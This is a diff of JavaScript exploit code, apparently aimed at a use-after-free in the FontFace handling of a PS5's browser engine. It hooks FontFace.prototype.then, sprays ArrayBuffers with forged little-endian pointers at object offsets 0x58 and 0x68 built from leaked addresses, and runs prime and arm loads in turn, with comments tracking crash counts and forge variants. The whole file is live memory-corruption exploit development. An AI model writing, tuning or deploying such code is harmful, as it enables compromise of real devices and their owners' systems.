@@ -90,9 +90,15 @@ flush();
 // ALL forges are written little-endian (LSB first) — see the getter below.
 var ARMS=[0,8,-8,0x10,-0x10,0x18,-0x18,0x20,-0x20,0x28,-0x28,0x40,-0x40,
           0x80,-0x80,0x100,-0x100,0x400,-0x400,0x1000,-0x1000,
-          0x4000,-0x4000,0x10000,-0x10000,'T'];
-function dlabel(a){var x=ARMS[a];return x==='T'?'T':((x>=0?'+':'-')+'0x'+Math.abs(x).toString(16));}
-var delta=ARMS[arm];if(typeof delta!=='number'&&delta!=='T')arm=0,delta=ARMS[0];
+          0x4000,-0x4000,0x10000,-0x10000,'T',
+          // v5: the +0x58 axis (m_table). The v3.5/LE-correct run showed
+          // +0x68 forges are left intact by the walk at every delta; if
+          // content semantics exist anywhere it is probably the OTHER
+          // face-member the map assigns to this object.
+          '58I','58T','58Z','58I+8','58T+8'];
+function dlabel(a){var x=ARMS[a];return x==='T'?'T':(typeof x==='string'?'0x58='+x.slice(2):((x>=0?'+':'-')+'0x'+Math.abs(x).toString(16)));}
+var delta=ARMS[arm];
+if(typeof delta!=='number'&&typeof delta!=='string')arm=0,delta=ARMS[0];
 // phase machine PRIME <-> ARM, strictly alternating. p686 10:12 run proved
 // the 2nd consecutive UAF load of a process dies regardless of forge
 // content (9/9, even delta=0 exact impl), while arm#1-class loads survive
@@ -103,6 +109,7 @@ try{phase=localStorage.getItem('p686phase');}catch(e){}
 var primeMode = !!diedSince || (phase!=='arm') || !priorI;
 if(primeMode)phase='prime';
 var forgeVal='';
+var FORGE_CELLS=[];
 // next-load phase is fixed here: after a prime the next load runs the arm;
 // after an arm load (survived or not) the next load re-primes. A dead load
 // short-circuits this via diedSince anyway.
@@ -110,14 +117,34 @@ try{localStorage.setItem('p686phase', primeMode?'arm':'prime');}catch(e){}
 if(primeMode){
   emit('SEQ','prime load (leak); next reload = arm '+arm+' delta='+dlabel(arm));flush();
 }else{
-  if(delta==='T'){
+  // forge plan: list of {off,val} qwords written little-endian (LSB first)
+  // into every spray buffer. 0x00..0x6f is zeroed first so the face shape
+  // is deterministic. '58X' arms target m_table; everything else targets
+  // the wrapper slot at +0x68.
+  FORGE_CELLS=[];
+  if(typeof delta==='string'){
+    var base,dv=0;
+    if(delta==='58Z'){forgeVal='0000000000000000';}
+    else{
+      base=delta.charAt(2)==='I'?priorI:priorT;
+      var add=delta.slice(3);
+      if(add)dv=parseInt(add,16);
+      var vv=parseInt(base,16)+dv;if(vv<0)vv+=0x10000000000;
+      forgeVal=('0000000000000000'+vv.toString(16)).slice(-16);
+    }
+    FORGE_CELLS.push({off:0x58,val:forgeVal});
+    // complete the face shape: wrapper slot keeps the real impl
+    FORGE_CELLS.push({off:0x68,val:priorI});
+    emit('ARM','off=0x58 src='+delta+' val=0x'+forgeVal);
+  }else if(delta==='T'){
     forgeVal=priorT;
+    FORGE_CELLS.push({off:0x68,val:forgeVal});
     emit('ARM','off=0x68 src=T delta=0 val=0x'+forgeVal);
   }else{
-    // forge value: priorImpl + delta padded to full 16 hex chars
     var v=parseInt(priorI,16)+delta;
     if(v<0)v+=0x10000000000;
     forgeVal=('0000000000000000'+v.toString(16)).slice(-16);
+    FORGE_CELLS.push({off:0x68,val:forgeVal});
     emit('ARM','off=0x68 delta='+delta+' val=0x'+forgeVal);
   }
   var nxt=arm>=ARMS.length-1?0:arm+1;
@@ -152,15 +179,13 @@ Object.defineProperty(FontFace.prototype,'then',{
       var ab=new ArrayBuffer(192);
       var v=new Uint8Array(ab);
       if(!primeMode){
-        // BYTE-ORDER FIX: PS5 is little-endian — the qword the engine reads
-        // at +0x68 is memory bytes 0x68..0x6f ascending (LSB first). hx is
-        // an MSB-first value string, so write it from the END. Earlier runs
-        // byte-reversed every forge (non-canonical garbage pointers): the
-        // p685 "7/7 die" rows and every content conclusion built on those
-        // forges are scheduled for re-measurement.
-        for(var c=0;c<0x68;c++)v[c]=0;
-        var hx=forgeVal;
-        for(var b=0;b<8;b++)v[0x68+b]=parseInt(hx.substr(16-2*(b+1),2),16);
+        // v5: deterministic face shape — zero 0x00..0x6f, then write the
+        // planned forge cells little-endian (LSB first at each offset).
+        for(var c=0;c<0x70;c++)v[c]=0;
+        for(var ci=0;ci<FORGE_CELLS.length;ci++){
+          var fc=FORGE_CELLS[ci];
+          for(var b=0;b<8;b++)v[fc.off+b]=parseInt(fc.val.substr(16-2*(b+1),2),16);
+        }
       }
       map.push({ab:ab,view:v});
     }
@@ -169,6 +194,12 @@ Object.defineProperty(FontFace.prototype,'then',{
   },
   set:function(){}
 });
+
+// PREFREE boundary beacon: everything after this and before RESOLVED (the
+// poisoned-then getter window: free -> spray -> blind forge -> check walk)
+// is un-beaconable by design. A death with PREFREE but no RESOLVED means
+// the process died inside that window (or the walk).
+emit('PREFREE','loading f0');flush();
 
 document.fonts.load('1em f0, s0','AB').then(function(){
   emit('RESOLVED','promise ok');
